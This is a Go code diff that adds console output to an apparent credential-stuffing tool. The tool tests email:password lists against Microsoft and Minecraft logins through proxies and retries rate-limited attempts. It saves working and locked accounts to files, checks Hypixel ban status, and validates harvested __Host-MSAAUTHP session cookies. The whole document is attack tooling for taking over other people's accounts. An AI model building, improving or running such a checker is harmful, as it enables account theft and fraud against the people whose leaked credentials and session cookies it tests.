@@ -31,37 +31,45 @@ func checkAccount(email, password, proxyURL string, cfg *Config) {
 		case "INVALID_CREDENTIALS":
 			atomic.AddInt64(&invalidCount, 1)
 			writeToFile("invalid.txt", fmt.Sprintf("[%s] %s:%s | %s", ts, email, password, ce.Message))
+			fmt.Printf("\n  [INVALID] %s:%s | %s", email, password, ce.Message)
 
 		case "LOCKED":
 			atomic.AddInt64(&lockedCount, 1)
 			line := fmt.Sprintf("[%s] [LOCKED] %s:%s | %s", ts, email, password, ce.Detail)
 			writeToFile("ms_valid.txt", line)
+			fmt.Printf("\n  [LOCKED] %s:%s | %s", email, password, ce.Detail)
 
 		case "RATE_LIMITED":
 			if cfg.RetryRateLimited {
-				fmt.Printf("\n  [RATE_LIMITED] Retrying %s...\n", email)
+				fmt.Printf("\n  [RATE_LIMITED] Retrying %s...", email)
 				mcToken, profile, err = fullAuth(email, password, proxyURL)
 				if err != nil {
 					ce2 := categorizeAuthError(err)
 					writeToFile("ms_valid.txt", fmt.Sprintf("[%s] [RATE_LIMITED] %s:%s | %s", ts, email, password, ce2.Detail))
 					logError("errors.log", email, err)
+					fmt.Printf("\n  [RATE_LIMITED] %s:%s | %s", email, password, ce2.Detail)
 					return
 				}
+				fmt.Printf("\n  [OK] %s:%s | retry succeeded", email, password)
 			} else {
 				writeToFile("ms_valid.txt", fmt.Sprintf("[%s] [RATE_LIMITED] %s:%s", ts, email, password))
+				fmt.Printf("\n  [RATE_LIMITED] %s:%s", email, password)
 				return
 			}
 
 		case "VERIFY_REQUIRED":
 			writeToFile("ms_valid.txt", fmt.Sprintf("[%s] [VERIFY] %s:%s", ts, email, password))
+			fmt.Printf("\n  [VERIFY] %s:%s", email, password)
 
 		case "TIMEOUT", "NETWORK":
 			writeToFile("ms_valid.txt", fmt.Sprintf("[%s] [%s] %s:%s | %s", ts, ce.Category, email, password, ce.Detail))
 			logError("network_errors.log", email, err)
+			fmt.Printf("\n  [%s] %s:%s | %s", ce.Category, email, password, ce.Detail)
 
 		default:
 			writeToFile("ban_check_unknown_errors.txt", fmt.Sprintf("[%s] %s:%s | %s", ts, email, password, ce.Detail))
 			logError("errors.log", email, err, proxyURL)
+			fmt.Printf("\n  [ERROR] %s:%s | %s", email, password, ce.Detail)
 		}
 		return
 	}
@@ -167,9 +175,11 @@ func checkAccount(email, password, proxyURL string, cfg *Config) {
 		if strings.Contains(banInfo, "banned") {
 			atomic.AddInt64(&hypixelBanned, 1)
 			writeToFile("hypixel_ban.txt", fmt.Sprintf("%s:%s | %s | %s", email, password, username, banInfo))
+			fmt.Printf("\n  [HYPIXEL] %s | %s", username, banInfo)
 		} else if strings.Contains(banInfo, "unbanned") {
 			atomic.AddInt64(&hypixelUnban, 1)
 			writeToFile("hypixel_unban.txt", fmt.Sprintf("%s:%s | %s | %s", email, password, username, banInfo))
+			fmt.Printf("\n  [HYPIXEL] %s | %s", username, banInfo)
 		}
 	}
 
@@ -221,13 +231,16 @@ func checkCookies(cookieFile, proxyURL string, cfg *Config) {
 		ce := categorizeCookieError(fmt.Errorf("parse error: %w", err))
 		atomic.AddInt64(&cookieInvalid, 1)
 		safeWrite("cookie_errors.log", fmt.Sprintf("[PARSE] %s | %s | %s", cookieFile, ce.Category, ce.Detail))
+		fmt.Printf("\n  [PARSE_ERR] %s | %s", cookieFile, ce.Detail)
 		return
 	}
 
 	msauthCookie, ok := cookies["__Host-MSAAUTHP"]
 	if !ok {
 		atomic.AddInt64(&cookieInvalid, 1)
-		safeWrite("cookie_errors.log", fmt.Sprintf("[MISSING] %s | No __Host-MSAAUTHP cookie found in file", cookieFile))
+		msg := fmt.Sprintf("[MISSING] %s | No __Host-MSAAUTHP cookie found in file", cookieFile)
+		safeWrite("cookie_errors.log", msg)
+		fmt.Printf("\n  [MISSING] %s | no __Host-MSAAUTHP cookie", cookieFile)
 		return
 	}
 
@@ -242,12 +255,16 @@ func checkCookies(cookieFile, proxyURL string, cfg *Config) {
 		switch ce.Category {
 		case "EXPIRED", "AUTH_FAILED", "MC_REJECTED":
 			safeWrite("cookie_invalid.txt", fmt.Sprintf("%s | %s: %s", cookieFile, ce.Category, ce.Message))
+			fmt.Printf("\n  [%s] %s | %s", ce.Category, cookieFile, ce.Message)
 		case "TIMEOUT", "NETWORK":
 			safeWrite("cookie_network_errors.log", logLine)
+			fmt.Printf("\n  [%s] %s", ce.Category, cookieFile)
 		case "RATE_LIMITED":
 			safeWrite("cookie_rate_limited.log", logLine)
+			fmt.Printf("\n  [RATE_LIMITED] %s", cookieFile)
 		default:
 			safeWrite("cookie_unknown_errors.log", logLine)
+			fmt.Printf("\n  [COOKIE_ERR] %s | %s", cookieFile, ce.Message)
 		}
 		return
 	}
@@ -341,10 +358,12 @@ func checkCookies(cookieFile, proxyURL string, cfg *Config) {
 			atomic.AddInt64(&hypixelBanned, 1)
 			safeWrite(filepath.Join(rd, "hypixel_ban.txt"), banInfo)
 			writeToFile("hypixel_ban.txt", fmt.Sprintf("%s | %s | %s", cookieFile, username, banInfo))
+			fmt.Printf("\n  [HYPIXEL] %s | %s", username, banInfo)
 		} else if strings.Contains(banInfo, "unbanned") {
 			atomic.AddInt64(&hypixelUnban, 1)
 			safeWrite(filepath.Join(rd, "hypixel_unban.txt"), banInfo)
 			writeToFile("hypixel_unban.txt", fmt.Sprintf("%s | %s | %s", cookieFile, username, banInfo))
+			fmt.Printf("\n  [HYPIXEL] %s | %s", username, banInfo)
 		}
 	}
 
